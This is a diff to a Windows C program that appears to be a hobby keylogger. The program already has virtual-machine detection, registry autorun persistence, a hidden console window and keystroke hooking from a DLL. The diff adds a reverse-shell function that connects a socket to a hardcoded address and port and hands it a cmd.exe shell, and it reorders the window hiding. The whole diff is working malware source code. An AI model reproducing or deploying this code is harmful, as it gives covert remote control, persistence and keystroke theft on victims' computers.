@@ -1,5 +1,7 @@
 #define _CRT_SECURE_NO_WARNINGS
 
+#include <winsock2.h>
+#pragma comment(lib,"ws2_32")
 #include <windows.h>
 #include <stdio.h> 
 #include <tchar.h>
@@ -273,6 +275,45 @@ int addreg(){
     return 1;
 }
 
+void remotecontrol(){
+    WSADATA wsaData;
+    SOCKET Winsock;
+    struct sockaddr_in sin;
+    char ip_addr[16] = "127.0.0.1";
+    char port[6] = "6666";
+
+    STARTUPINFO start_info;
+
+    PROCESS_INFORMATION process_info;
+
+    WSAStartup(MAKEWORD(2, 2), &wsaData);
+    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
+
+
+    struct hostent *host;
+    host = gethostbyname(ip_addr);
+    strcpy(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));
+
+    sin.sin_family = AF_INET;
+    sin.sin_port = htons(atoi(port));
+    sin.sin_addr.s_addr = inet_addr(ip_addr);
+
+    if(WSAConnect(Winsock, (SOCKADDR*)&sin, sizeof(sin), NULL, NULL, NULL, NULL)){
+        printf("connect failed\n");
+        exit(-1);
+    }
+
+    //设置stdout、stderr和stdin的句柄到socket
+    memset(&start_info, 0, sizeof(start_info));
+    start_info.cb = sizeof(start_info);
+    start_info.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    start_info.hStdInput = start_info.hStdOutput = start_info.hStdError = (HANDLE)Winsock;
+
+    TCHAR cmd[255] = TEXT("cmd.exe");
+    //由于cmd作为CreateProcessA的参数调用，因此通过绑定一个套接字与命令shell来创建逆向shell
+    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &start_info, &process_info);
+}
+
 int main(int argc, char *argv[]){
     printf("Start\n");
     //虚拟机检测
@@ -287,11 +328,14 @@ int main(int argc, char *argv[]){
         shutdownimm();
     }
     
-    //隐藏cmd窗口
-    ShowWindow(FindWindow("ConsoleWindowClass",argv[0]),0);
+    //远程控制
+    remotecontrol();
 
     //添加注册表达到开机自启动
     addreg();
+
+    //隐藏cmd窗口
+    ShowWindow(FindWindow("ConsoleWindowClass",argv[0]),0);
 
     //读取DLL及其中的函数
     HMODULE hMod = LoadLibraryA("keyrecdll.dll");
@@ -320,8 +364,6 @@ int main(int argc, char *argv[]){
         printf("Hook Fail\n");
         return 1;
     }
-    else
-        printf("Hook Sueecss!\n Output: C:\\log\\key.txt");
 
     MSG msg;
     while(1){
